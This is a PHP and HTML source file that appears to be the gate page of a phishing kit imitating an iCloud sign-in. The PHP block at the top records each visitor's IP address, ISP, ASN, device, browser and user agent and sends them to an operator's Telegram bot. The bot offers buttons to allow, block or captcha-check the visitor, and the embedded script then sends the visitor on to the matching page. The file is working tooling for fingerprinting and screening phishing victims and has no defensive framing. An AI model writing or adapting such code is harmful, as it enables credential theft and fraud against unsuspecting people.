<?php
session_start();
ob_start(); 
require_once('../includes/php/detect.php');
require_once('../config.php');

if (!function_exists('curl_init')) {
  die('Error: cURL must be enabled on the server.');
}

if(!isset($_SESSION['fallow'])) $_SESSION['fallow'] = true;


$_SESSION['unique_id'] = bin2hex(random_bytes(16));
  
if ($live_control['access_manipulation'] === true) {

  $btnRcap = array(
      array(
          array('text' => 'Allow Access ✅', 'callback_data' => $_SESSION['unique_id'] . ' allowed'),
      ),
      array(
          array('text' => 'Block Access ⛔️', 'callback_data' => $_SESSION['unique_id'] . ' blocked'),
        ),
      array(
        array('text' => 'Request Captcha ♻️', 'callback_data' => $_SESSION['unique_id'] . ' captcha_check'),
      ),
    );

  $buttons = array(
      'inline_keyboard' => $btnRcap
  );
  
  include_once('../includes/php/bot_api.php');

$message = '📦 <code>'.$_SESSION['user_data']['query'].'</code> <b>is online</b>

<b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
<b>ISP:</b> '.$_SESSION['user_data']['isp'].'
<b>ORG:</b> '.$_SESSION['user_data']['org'].'
<b>ASN:</b> '.$_SESSION['user_data']['as'].'
<b>DEVICE:</b> '.$_SESSION['device'].'
<b>BROWSER:</b> '.$_SESSION['browser'].'
<b>OS:</b> '.$_SESSION['os'].'
<b>USER AGENT:</b> '.$_SERVER['HTTP_USER_AGENT'].'

<b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>';
  $status = bot_api($message, $buttons);
  if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');
}elseif($live_control['access_auto'] == 'captcha'){
  header('location: ../settings/captcha.php');
  exit();
}else{
  header('location: ../settings/access_check.php');
  exit();
}
?>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
      <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title></title>
      <link rel="stylesheet" type="text/css" href="../settings/css/index.css">
      <link rel="stylesheet" type="text/css" href="../settings/css/app.css">
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   </head>
   <body>
      <div id="root">
         <panel>
            <div class="root-viewport">
               <div class="root-component">
                  <div class="page-viewport landing-page-route fade-in">
                     <div class="page-content">
                     <header class="cloudos-toolbar login overlay">
                      <div class="logo" style="margin-top:10px">
                          <a href="javascript:void(0);" aria-label="">
                          <img src="../settings/media/cloud.jpg" alt="">
                          </a>
                      </div>
                  </header>
                        <div class="home-login-component">
                           <div class="parent-container is-visible" style="display: flex; justify-content: center; align-items: center">
                              <div style="visibility: visible; height: auto;">
                              <ui-activity-indicator role="progressbar" class="standard" aria-label="Loading">
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                              </ui-activity-indicator>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
        </panel>
      </div>
      <?php
    require_once('../includes/js/startRequest.php'); 
    require_once('../includes/js/makeRequest.php'); 
    ?>
    <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> allowed" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> blocked" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> captcha_check")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];
          
          deleteMessage(chatId, messageId);

        if (action === "allowed") {
            window.location.href = "settings/access_check.php"; 
            console.log("access allowed!");
        } else if (action === "blocked") {
            window.location.href = "404.php"; 
            console.log("access denied!");
        } else if (action === "captcha_check") {
            window.location.href = "settings/captcha.php"; 
            console.log("captcha check!");
        } 

          break;
        }
      }
    }
  </script>
  <?php require_once('../includes/js/deleteMessage.php'); ?>
   </body>
</html>